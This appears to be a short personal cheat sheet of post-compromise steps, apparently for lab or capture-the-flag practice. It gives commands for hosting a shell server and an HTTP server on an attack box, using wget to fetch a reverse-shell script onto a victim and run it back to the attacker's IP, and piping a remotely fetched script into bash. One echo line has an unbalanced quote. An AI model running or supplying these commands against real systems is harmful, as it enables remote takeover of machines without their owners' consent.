After host is compromised

host a shellserver
python3 <file name>

host an http server
python3 -m http.server <port>

download reverseshell from http server
`wget <attack box IP>:<port>/<file name>`

run reverseshell to connect to shellserver
`python <file name> <attack box IP> &`
  
create a file with code
echo "ping <IP> > <file name.sh>

run cmd on victim
wget -O - <attack box IP>:<port>/<file name.sh> | bash
